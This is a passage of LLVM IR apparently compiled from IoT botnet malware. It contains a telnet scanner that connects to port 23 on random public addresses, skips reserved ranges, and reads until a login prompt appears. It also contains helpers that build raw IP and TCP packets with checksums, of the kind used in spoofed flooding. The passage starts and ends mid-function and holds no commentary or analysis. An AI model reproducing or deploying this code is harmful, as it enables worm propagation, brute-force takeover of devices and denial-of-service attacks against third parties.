  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !3
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #3
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #3
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #14
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* @ipState.1, align 1
  %4 = icmp eq i8 %3, -1
  %5 = load i8, i8* @ipState.2, align 1
  %6 = icmp eq i8 %5, -1
  %or.cond = or i1 %4, %6
  %7 = load i8, i8* @ipState.3, align 1
  %8 = icmp eq i8 %7, -1
  %or.cond19 = or i1 %or.cond, %8
  %9 = load i8, i8* @ipState.4, align 1
  %10 = icmp eq i8 %9, -1
  %or.cond21 = or i1 %or.cond19, %10
  br i1 %or.cond21, label %.critedge.preheader, label %11

.critedge.preheader:                              ; preds = %0
  br label %.critedge

; <label>:11:                                     ; preds = %0
  %12 = add i8 %3, 1
  store i8 %12, i8* @ipState.1, align 1
  %13 = load i8, i8* @ipState.2, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @ipState.2, align 1
  %15 = load i8, i8* @ipState.3, align 1
  %16 = add i8 %15, 1
  store i8 %16, i8* @ipState.3, align 1
  %17 = load i8, i8* @ipState.4, align 1
  %18 = add i8 %17, 1
  store i8 %18, i8* @ipState.4, align 1
  %19 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %20 = load i8, i8* @ipState.1, align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* @ipState.2, align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* @ipState.3, align 1
  %25 = zext i8 %24 to i32
  %26 = zext i8 %18 to i32
  %27 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %19, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 %21, i32 %23, i32 %25, i32 %26)
  br label %87

.critedge:                                        ; preds = %.critedge.backedge, %.critedge.preheader
  %28 = tail call i32 @rand() #3
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* @ipState.1, align 1
  %31 = tail call i32 @rand() #3
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* @ipState.2, align 1
  %34 = tail call i32 @rand() #3
  %35 = srem i32 %34, 255
  %36 = trunc i32 %35 to i8
  store i8 %36, i8* @ipState.3, align 1
  %37 = tail call i32 @rand() #3
  %38 = srem i32 %37, 255
  %39 = trunc i32 %38 to i8
  store i8 %39, i8* @ipState.4, align 1
  %40 = load i8, i8* @ipState.1, align 1
  switch i8 %40, label %45 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %41
  ]

; <label>:41:                                     ; preds = %.critedge
  %42 = load i8, i8* @ipState.2, align 1
  %43 = icmp ugt i8 %42, 63
  %44 = icmp sgt i8 %42, -1
  %or.cond22 = and i1 %43, %44
  br i1 %or.cond22, label %.critedge.backedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %41
  %.pr = load i8, i8* @ipState.1, align 1
  br label %45

; <label>:45:                                     ; preds = %thread-pre-split, %.critedge
  %46 = phi i8 [ %.pr, %thread-pre-split ], [ %40, %.critedge ]
  switch i8 %46, label %50 [
    i8 127, label %.critedge.backedge
    i8 -87, label %47
  ]

; <label>:47:                                     ; preds = %45
  %48 = load i8, i8* @ipState.2, align 1
  %49 = icmp eq i8 %48, -2
  br i1 %49, label %.critedge.backedge, label %50

.critedge.backedge:                               ; preds = %47, %.critedge, %.critedge, %41, %45, %50, %55, %60, %67, %74, %64
  br label %.critedge

; <label>:50:                                     ; preds = %45, %47
  %51 = load i8, i8* @ipState.1, align 1
  %52 = icmp eq i8 %51, -84
  %53 = load i8, i8* @ipState.2, align 1
  %54 = icmp ult i8 %53, 17
  %or.cond24 = and i1 %52, %54
  br i1 %or.cond24, label %.critedge.backedge, label %55

; <label>:55:                                     ; preds = %50
  %56 = icmp eq i8 %51, -64
  %57 = icmp eq i8 %53, 0
  %or.cond26 = and i1 %56, %57
  %58 = load i8, i8* @ipState.3, align 1
  %59 = icmp eq i8 %58, 2
  %or.cond28 = and i1 %or.cond26, %59
  br i1 %or.cond28, label %.critedge.backedge, label %60

; <label>:60:                                     ; preds = %55
  %61 = icmp eq i8 %53, 88
  %or.cond30 = and i1 %56, %61
  %62 = icmp eq i8 %58, 99
  %or.cond32 = and i1 %or.cond30, %62
  %63 = icmp eq i8 %53, -88
  %or.cond34 = and i1 %56, %63
  %or.cond43 = or i1 %or.cond34, %or.cond32
  br i1 %or.cond43, label %.critedge.backedge, label %64

; <label>:64:                                     ; preds = %60
  %65 = icmp eq i8 %51, -58
  %66 = and i8 %53, -2
  %switch = icmp eq i8 %66, 18
  %or.cond44 = and i1 %65, %switch
  br i1 %or.cond44, label %.critedge.backedge, label %67

; <label>:67:                                     ; preds = %64
  %68 = load i8, i8* @ipState.1, align 1
  %69 = icmp eq i8 %68, -58
  %70 = load i8, i8* @ipState.2, align 1
  %71 = icmp eq i8 %70, 51
  %or.cond36 = and i1 %69, %71
  %72 = load i8, i8* @ipState.3, align 1
  %73 = icmp eq i8 %72, 100
  %or.cond38 = and i1 %or.cond36, %73
  br i1 %or.cond38, label %.critedge.backedge, label %74

; <label>:74:                                     ; preds = %67
  %75 = icmp eq i8 %68, -53
  %76 = icmp eq i8 %70, 0
  %or.cond40 = and i1 %75, %76
  %77 = icmp eq i8 %72, 113
  %or.cond42 = and i1 %or.cond40, %77
  %78 = icmp ugt i8 %68, -33
  %or.cond45 = or i1 %78, %or.cond42
  br i1 %or.cond45, label %.critedge.backedge, label %79

; <label>:79:                                     ; preds = %74
  %80 = zext i8 %68 to i32
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %82 = zext i8 %70 to i32
  %83 = zext i8 %72 to i32
  %84 = load i8, i8* @ipState.4, align 1
  %85 = zext i8 %84 to i32
  %86 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %81, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 %80, i32 %82, i32 %83, i32 %85)
  br label %87

; <label>:87:                                     ; preds = %79, %11
  %.sink = phi i8* [ %81, %79 ], [ %19, %11 ]
  %88 = call i32 @inet_addr(i8* %.sink) #3
  ret i32 %88
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #17
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !4

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #17
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScan() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca %struct.timeval, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 @getdtablesize() #3
  %7 = sdiv i32 %6, 4
  %8 = mul nsw i32 %7, 3
  %9 = icmp slt i32 %8, 512
  %10 = select i1 %9, i32 %8, i32 512
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 23) #17
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = zext i32 %10 to i64
  %17 = alloca %struct.telstate_t, i64 %16, align 16
  %18 = bitcast %struct.telstate_t* %17 to i8*
  %19 = sext i32 %10 to i64
  %20 = mul nsw i64 %19, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 %20, i32 16, i1 false)
  %21 = icmp sgt i32 %6, 3
  br i1 %21, label %.lr.ph309.preheader, label %.preheader

.lr.ph309.preheader:                              ; preds = %0
  %22 = sext i32 %10 to i64
  br label %.lr.ph309

.preheader.loopexit:                              ; preds = %.lr.ph309
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %0
  %23 = icmp sgt i32 %6, 3
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %26 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 1
  br label %.loopexit

.lr.ph309:                                        ; preds = %.lr.ph309.preheader, %.lr.ph309
  %indvars.iv = phi i64 [ 0, %.lr.ph309.preheader ], [ %indvars.iv.next, %.lr.ph309 ]
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 3
  store i8 1, i8* %27, align 1
  %28 = tail call noalias i8* @malloc(i64 1024) #3
  %29 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 8
  store i8* %28, i8** %29, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %30 = icmp slt i64 %indvars.iv.next, %22
  br i1 %30, label %.lr.ph309, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %23, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 0
  %33 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %597
  %.1307 = phi i32 [ %.mux, %597 ], [ 0, %.lr.ph.preheader ]
  %34 = sext i32 %.1307 to i64
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 2
  %37 = load i8, i8* %36, align 8
  switch i8 %37, label %597 [
    i8 0, label %38
    i8 1, label %86
    i8 2, label %135
    i8 3, label %203
    i8 4, label %226
    i8 5, label %325
    i8 6, label %348
    i8 7, label %561
    i8 8, label %571
  ]

; <label>:38:                                     ; preds = %.lr.ph
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %40 = load i8*, i8** %39, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1024, i32 1, i1 false)
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  %42 = load i8, i8* %41, align 1
  %43 = icmp eq i8 %42, 0
  br i1 %43, label %50, label %44

; <label>:44:                                     ; preds = %38
  %45 = bitcast i8** %39 to i64*
  %46 = load i64, i64* %45, align 8
  %47 = bitcast %struct.telstate_t* %35 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 32, i32 16, i1 false)
  store i64 %46, i64* %45, align 8
  %48 = call i32 @getRandomPublicIP()
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  store i32 %48, i32* %49, align 4
  br label %64

; <label>:50:                                     ; preds = %38
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 5
  %52 = load i8, i8* %51, align 1
  %53 = add i8 %52, 1
  store i8 %53, i8* %51, align 1
  %54 = icmp eq i8 %53, 18
  br i1 %54, label %55, label %59

; <label>:55:                                     ; preds = %50
  store i8 0, i8* %51, align 1
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %57 = load i8, i8* %56, align 2
  %58 = add i8 %57, 1
  store i8 %58, i8* %56, align 2
  br label %59

; <label>:59:                                     ; preds = %55, %50
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %61 = load i8, i8* %60, align 2
  %62 = icmp eq i8 %61, 10
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %59
  store i8 1, i8* %41, align 1
  br label %597

; <label>:64:                                     ; preds = %59, %44
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  %66 = load i32, i32* %65, align 4
  store i32 %66, i32* %24, align 4
  %67 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  store i32 %67, i32* %68, align 16
  %69 = icmp eq i32 %67, -1
  br i1 %69, label %597, label %70

; <label>:70:                                     ; preds = %64
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %67, i32 3, i8* null) #3
  %72 = or i32 %71, 2048
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %67, i32 4, i32 %72) #3
  %74 = load i32, i32* %68, align 16
  %75 = call i32 @connect(i32 %74, %struct.sockaddr* nonnull %31, i32 16) #3
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %84

; <label>:77:                                     ; preds = %70
  %78 = tail call i32* @__errno_location() #17
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %84, label %81

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %68, align 16
  %83 = call i32 @sclose(i32 %82)
  store i8 1, i8* %41, align 1
  br label %597

; <label>:84:                                     ; preds = %77, %70
  store i8 1, i8* %36, align 8
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  store i32 0, i32* %85, align 4
  br label %597

; <label>:86:                                     ; preds = %.lr.ph
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %92

; <label>:90:                                     ; preds = %86
  %91 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %91, i32* %87, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %90
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %25) #3, !srcloc !6
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %95 = load i32, i32* %94, align 16
  %96 = srem i32 %95, 64
